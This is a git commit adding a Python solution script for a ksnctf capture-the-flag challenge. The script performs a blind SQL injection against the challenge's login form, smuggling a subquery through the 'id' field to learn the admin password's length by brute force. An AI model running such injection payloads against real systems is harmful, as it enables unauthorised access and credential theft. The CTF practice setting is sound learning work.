3b26a2b8a3f66f3b078fb2447b0de688c782552e
yoshio36 <yoshiooyama36@gmail.com>
2020-10-28 23:46:13 +0900

    add 20201028

---
+++ ksnctf/q6_injection/q6_injection.py
@@ -0,0 +1,17 @@
+import requests
+url = 'http://ctfq.sweetduet.info:10080/~q6/'
+for i in range(1, 100):
+    # 1.$idを起点にinjection
+    # 2.idはadminでなければならないので,id=adminを入力後エスケープ
+    # 3.TRUEになるようなSQL文を書く必要がある
+    sql = 'admin\' AND (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') = {counter} --'.format(
+        counter=i)
+    payload = {
+        'id': sql,
+    }
+    #print(sql)
+    response = requests.post(url, data=payload)
+    print(response)
+    if len(response.text) > 2000:
+       print('length of the password is {counter}'.format(counter=i))
+       break
